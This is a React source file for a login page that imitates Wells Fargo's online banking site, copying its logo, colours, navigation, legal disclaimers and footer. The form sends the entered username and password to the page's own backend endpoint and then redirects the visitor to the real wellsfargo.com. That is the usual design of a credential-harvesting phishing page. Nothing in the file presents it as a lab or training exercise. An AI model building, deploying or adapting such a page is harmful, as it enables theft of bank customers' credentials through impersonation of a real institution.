import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { X, Search, Key, Shield, Lock, ChevronDown, MapPin, Phone, MessageCircle, Smartphone, CreditCard, Home, PiggyBank, TrendingUp, Car, GraduationCap, Briefcase } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting(): string {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 18) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting, setGreeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const interval = setInterval(() => {
      setGreeting(getGreeting());
    }, 60000);
    return () => clearInterval(interval);
  }, []);

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const usernameValue = form.watch("username");

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Sign On Successful",
        description: "Redirecting to Wells Fargo...",
      });
      setTimeout(() => {
        window.location.href = "https://www.wellsfargo.com/";
      }, 1000);
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password.",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const clearUsername = () => {
    form.setValue("username", "");
  };

  const quickLinks = [
    { icon: CreditCard, label: "Credit Cards", desc: "Compare cards & apply" },
    { icon: Home, label: "Home Loans", desc: "Mortgages & refinancing" },
    { icon: PiggyBank, label: "Savings", desc: "Earn more with savings" },
    { icon: Car, label: "Auto Loans", desc: "Finance your vehicle" },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]">
      {/* Top utility bar */}
      <div className="bg-[#262626] text-white text-xs">
        <div className="max-w-7xl mx-auto px-4 py-2">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <a href="#" className="hover:underline flex items-center gap-1" data-testid="link-locations">
                <MapPin className="w-3 h-3" />
                Find a Location
              </a>
              <a href="#" className="hover:underline flex items-center gap-1" data-testid="link-contact">
                <Phone className="w-3 h-3" />
                1-800-TO-WELLS
              </a>
            </div>
            <div className="flex items-center gap-4">
              <a href="#" className="hover:underline" data-testid="link-appointments">
                Schedule an Appointment
              </a>
              <a href="#" className="hover:underline" data-testid="link-espanol">
                Español
              </a>
              <a href="#" className="hover:underline flex items-center gap-1" data-testid="link-messages">
                <MessageCircle className="w-3 h-3" />
                Messages
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* Main header */}
      <header className="bg-[#d71e28] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3" data-testid="logo-container">
              <svg viewBox="0 0 40 40" className="w-10 h-10" fill="none">
                <circle cx="20" cy="20" r="18" fill="#ffcd41" stroke="#d71e28" strokeWidth="2"/>
                <circle cx="20" cy="20" r="12" fill="none" stroke="#d71e28" strokeWidth="2"/>
                <circle cx="20" cy="20" r="6" fill="#d71e28"/>
              </svg>
              <div>
                <span className="text-xl font-bold tracking-wider block leading-tight" data-testid="text-logo">
                  WELLS FARGO
                </span>
                <span className="text-[10px] tracking-widest opacity-80">ESTABLISHED 1852</span>
              </div>
            </div>

            <div className="flex items-center gap-4">
              <div className="relative hidden lg:block">
                <Input
                  placeholder="Search wellsfargo.com"
                  className="w-64 h-9 bg-white/10 border-white/30 text-white placeholder:text-white/70 text-sm rounded pr-9"
                  data-testid="input-search"
                />
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/70" />
              </div>
              <button className="lg:hidden p-2 hover:bg-white/10 rounded">
                <Search className="w-5 h-5" />
              </button>
              <a href="#" className="hidden md:flex items-center gap-1 text-sm hover:underline">
                <Smartphone className="w-4 h-4" />
                Get the App
              </a>
            </div>
          </div>
        </div>

        {/* Navigation bar */}
        <nav className="bg-[#b91c23]">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-0 overflow-x-auto">
                {[
                  { name: "Personal", active: true },
                  { name: "Investing & Wealth" },
                  { name: "Small Business" },
                  { name: "Commercial Banking" },
                  { name: "Corporate & Investment" },
                ].map((item) => (
                  <button
                    key={item.name}
                    className={`px-4 py-3 text-sm text-white whitespace-nowrap flex items-center gap-1 transition-colors border-b-2 ${
                      item.active ? "border-[#ffcd41] bg-[#a01820]" : "border-transparent hover:bg-white/10"
                    }`}
                    data-testid={`nav-${item.name.toLowerCase().replace(/ /g, "-")}`}
                  >
                    {item.name}
                    <ChevronDown className="w-3 h-3" />
                  </button>
                ))}
              </div>
              <a href="#" className="text-white text-sm hover:underline hidden md:block">
                Open an Account
              </a>
            </div>
          </div>
        </nav>

        {/* Sub navigation */}
        <div className="bg-[#8a1419]">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center gap-6 py-2 overflow-x-auto text-xs">
              {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto", "Investing", "Rewards"].map((item) => (
                <a
                  key={item}
                  href="#"
                  className="text-white/90 hover:text-white hover:underline whitespace-nowrap"
                  data-testid={`subnav-${item.toLowerCase().replace(/ /g, "-")}`}
                >
                  {item}
                </a>
              ))}
            </div>
          </div>
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="bg-[#ffcd41] h-2"></div>

      {/* Main content with background */}
      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `linear-gradient(to bottom, rgba(0,0,0,0.05), rgba(0,0,0,0.2)), url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
          backgroundAttachment: "fixed",
        }}
      >
        {/* Promo banner */}
        <div className="bg-white/95 backdrop-blur border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-6">
                <span className="text-sm text-gray-700">
                  <strong className="text-[#d71e28]">NEW:</strong> Earn unlimited 2% cash rewards with Active Cash<sup>®</sup> Card
                </span>
                <a href="#" className="text-[#d71e28] text-sm font-medium hover:underline">
                  Learn More →
                </a>
              </div>
              <button className="text-gray-400 hover:text-gray-600">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>

        <div className="max-w-6xl mx-auto px-4 py-8">
          <div className="grid lg:grid-cols-3 gap-8">
            {/* Login Card */}
            <div className="lg:col-span-1">
              <Card className="shadow-xl border-0 bg-white" data-testid="card-login">
                <CardContent className="p-6">
                  <h1
                    className="text-2xl text-center text-gray-800 mb-6 font-light"
                    data-testid="text-greeting"
                  >
                    {greeting}
                  </h1>

                  <Form {...form}>
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                      <FormField
                        control={form.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem>
                            <FormControl>
                              <div className="relative">
                                <Input
                                  placeholder="Username"
                                  className="h-12 pr-10 border-gray-300 rounded text-base focus:border-[#d71e28] focus:ring-[#d71e28]"
                                  data-testid="input-username"
                                  {...field}
                                />
                                {usernameValue && (
                                  <button
                                    type="button"
                                    onClick={clearUsername}
                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                                    data-testid="button-clear-username"
                                  >
                                    <X className="w-5 h-5" />
                                  </button>
                                )}
                              </div>
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={form.control}
                        name="password"
                        render={({ field }) => (
                          <FormItem>
                            <FormControl>
                              <div className="relative">
                                <Input
                                  type={showPassword ? "text" : "password"}
                                  placeholder="Password"
                                  className="h-12 pr-16 border-gray-300 rounded text-base focus:border-[#d71e28] focus:ring-[#d71e28]"
                                  data-testid="input-password"
                                  {...field}
                                />
                                <button
                                  type="button"
                                  onClick={() => setShowPassword(!showPassword)}
                                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] text-sm font-medium hover:underline"
                                  data-testid="button-toggle-password"
                                >
                                  {showPassword ? "Hide" : "Show"}
                                </button>
                              </div>
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={form.control}
                        name="saveUsername"
                        render={({ field }) => (
                          <FormItem>
                            <div className="flex items-start gap-2">
                              <FormControl>
                                <Checkbox
                                  checked={field.value}
                                  onCheckedChange={field.onChange}
                                  className="mt-0.5 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                                  data-testid="checkbox-save-username"
                                />
                              </FormControl>
                              <div className="text-sm">
                                <label className="text-gray-700 cursor-pointer">
                                  Save username
                                </label>
                              </div>
                            </div>
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full border-0 shadow-md"
                        disabled={loginMutation.isPending}
                        data-testid="button-sign-on"
                      >
                        {loginMutation.isPending ? "Signing on..." : "Sign On"}
                      </Button>

                      <div className="flex items-center gap-3 text-gray-400 text-sm py-1">
                        <div className="flex-1 h-px bg-gray-200"></div>
                        <span>or</span>
                        <div className="flex-1 h-px bg-gray-200"></div>
                      </div>

                      <Button
                        type="button"
                        variant="outline"
                        className="w-full h-10 rounded-full border-2 border-gray-700 text-gray-700 font-medium hover:bg-gray-50 text-sm"
                        data-testid="button-passkey"
                      >
                        <Key className="w-4 h-4 mr-2" />
                        Use a passkey
                      </Button>
                    </form>
                  </Form>

                  <div className="mt-4 text-center">
                    <Link
                      href="/forgot-password"
                      className="text-[#d71e28] text-sm hover:underline"
                      data-testid="link-forgot"
                    >
                      → Forgot username or password?
                    </Link>
                  </div>

                  <div className="mt-4 pt-4 border-t border-gray-200">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">New to Online Banking?</span>
                      <Link
                        href="/register"
                        className="text-[#d71e28] text-sm font-semibold hover:underline"
                        data-testid="link-register"
                      >
                        Enroll Now
                      </Link>
                    </div>
                  </div>

                  <div className="mt-4 pt-4 border-t border-gray-200 flex items-center justify-center gap-2 text-xs text-gray-500">
                    <Shield className="w-4 h-4 text-green-600" />
                    <span>Secure Sign On</span>
                    <Lock className="w-3 h-3" />
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Quick Links */}
            <div className="lg:col-span-2">
              <h2 className="text-white text-xl font-semibold mb-4 drop-shadow-lg">
                Explore Our Products
              </h2>
              <div className="grid sm:grid-cols-2 gap-4">
                {quickLinks.map((link) => (
                  <Card key={link.label} className="bg-white/95 backdrop-blur hover:shadow-lg transition-shadow cursor-pointer border-0">
                    <CardContent className="p-5">
                      <div className="flex items-start gap-4">
                        <div className="w-12 h-12 bg-[#d71e28]/10 rounded-full flex items-center justify-center flex-shrink-0">
                          <link.icon className="w-6 h-6 text-[#d71e28]" />
                        </div>
                        <div>
                          <h3 className="font-semibold text-gray-800 mb-1">{link.label}</h3>
                          <p className="text-sm text-gray-600">{link.desc}</p>
                          <a href="#" className="text-[#d71e28] text-sm font-medium hover:underline mt-2 inline-block">
                            Learn More →
                          </a>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>

              {/* Featured offers */}
              <Card className="mt-6 bg-gradient-to-r from-[#d71e28] to-[#8a1419] border-0 text-white">
                <CardContent className="p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-[#ffcd41] text-sm font-medium mb-1">LIMITED TIME OFFER</p>
                      <h3 className="text-xl font-bold mb-2">Earn $300 Bonus</h3>
                      <p className="text-white/90 text-sm">Open a new Everyday Checking account with qualifying activities</p>
                    </div>
                    <Button className="bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full px-6">
                      Open Now
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>

        {/* Disclaimer Card */}
        <div className="max-w-6xl mx-auto px-4 pb-8">
          <Card className="shadow-lg border-0 bg-white">
            <CardContent className="p-5">
              <h3 className="font-bold text-gray-800 text-sm mb-3">
                Investment and Insurance Products are:
              </h3>
              <div className="grid sm:grid-cols-3 gap-3 text-sm text-gray-600">
                <div className="flex items-start gap-2">
                  <span className="text-[#d71e28] font-bold mt-0.5">•</span>
                  <span>Not Insured by the FDIC or Any Federal Government Agency</span>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-[#d71e28] font-bold mt-0.5">•</span>
                  <span>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</span>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-[#d71e28] font-bold mt-0.5">•</span>
                  <span>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</span>
                </div>
              </div>
              <div className="mt-4 pt-3 border-t border-gray-200 flex flex-wrap items-center justify-between gap-3">
                <p className="text-xs text-gray-500">
                  Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
                </p>
                <div className="flex items-center gap-4 text-xs text-gray-600">
                  <span className="font-bold border border-gray-400 px-2 py-0.5 rounded">FDIC</span>
                  <span>Equal Housing Lender</span>
                  <span className="font-bold">NMLSR ID 399801</span>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#262626] text-white">
        <div className="max-w-7xl mx-auto px-4 py-8">
          <div className="grid sm:grid-cols-2 lg:grid-cols-5 gap-8 mb-8">
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">About Wells Fargo</h4>
              <ul className="space-y-2 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white">Careers</a></li>
                <li><a href="#" className="hover:text-white">Diversity and Accessibility</a></li>
                <li><a href="#" className="hover:text-white">Investor Relations</a></li>
                <li><a href="#" className="hover:text-white">Newsroom</a></li>
                <li><a href="#" className="hover:text-white">Sustainability</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Customer Service</h4>
              <ul className="space-y-2 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white">Contact Us</a></li>
                <li><a href="#" className="hover:text-white">FAQs</a></li>
                <li><a href="#" className="hover:text-white">Accessibility</a></li>
                <li><a href="#" className="hover:text-white">Report Email Fraud</a></li>
                <li><a href="#" className="hover:text-white">Security Center</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Banking</h4>
              <ul className="space-y-2 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white">Checking Accounts</a></li>
                <li><a href="#" className="hover:text-white">Savings Accounts & CDs</a></li>
                <li><a href="#" className="hover:text-white">Debit Cards</a></li>
                <li><a href="#" className="hover:text-white">Credit Cards</a></li>
                <li><a href="#" className="hover:text-white">Foreign Exchange</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Borrowing</h4>
              <ul className="space-y-2 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white">Home Mortgage</a></li>
                <li><a href="#" className="hover:text-white">Refinance</a></li>
                <li><a href="#" className="hover:text-white">Home Equity Lines</a></li>
                <li><a href="#" className="hover:text-white">Personal Loans</a></li>
                <li><a href="#" className="hover:text-white">Auto Loans</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Investing</h4>
              <ul className="space-y-2 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white">Wells Fargo Advisors</a></li>
                <li><a href="#" className="hover:text-white">Brokerage Accounts</a></li>
                <li><a href="#" className="hover:text-white">Retirement Planning</a></li>
                <li><a href="#" className="hover:text-white">Wealth Management</a></li>
                <li><a href="#" className="hover:text-white">Private Banking</a></li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-700 pt-6">
            <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-400 mb-4">
              <a href="#" className="hover:text-white">Privacy, Cookies, Security & Legal</a>
              <span className="text-gray-600">|</span>
              <a href="#" className="hover:text-white">Notice of Data Collection</a>
              <span className="text-gray-600">|</span>
              <a href="#" className="hover:text-white">General Terms of Use</a>
              <span className="text-gray-600">|</span>
              <a href="#" className="hover:text-white">Online Access Agreement</a>
              <span className="text-gray-600">|</span>
              <a href="#" className="hover:text-white">Ad Choices</a>
              <span className="text-gray-600">|</span>
              <a href="#" className="hover:text-white">Do Not Sell or Share My Personal Information</a>
            </div>
            <p className="text-xs text-gray-500 text-center">
              © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
